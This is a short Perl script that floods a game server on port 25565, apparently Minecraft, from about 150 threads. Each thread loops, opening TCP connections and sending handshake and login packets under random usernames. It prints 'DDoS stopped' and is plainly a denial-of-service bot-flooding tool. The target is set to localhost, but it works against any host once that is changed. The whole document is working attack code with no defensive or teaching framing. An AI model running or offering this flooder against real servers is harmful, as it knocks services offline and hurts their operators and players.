use Socket;
use threads;
$host = '127.0.0.1';
$port = 25565;
$thread = 150;
$protocol = chr(47);
$connects = 0;
for ($i=0;$i<=$thread;$i++){
    threads->new(\&new_bot);
}
sleep 10;
print "DDoS stopped";
exit(0);
sub new_bot
{
    while (1) {
        socket($sock, AF_INET, SOCK_STREAM, getprotobyname('tcp'));
        connect($sock , sockaddr_in($port, inet_aton($host)));
        $connects += 1;
        $username = 1111111111 + int(rand(9999999999 - 1111111111));
        send($sock , "\x06\x00$protocol\x00\x00\x00\x02" , 0);
        send($sock , "\x0c\x00\n$username", 0);
        print "[$username/$connects]\n";
        sleep(0.01);
        close($sock);
    }
}
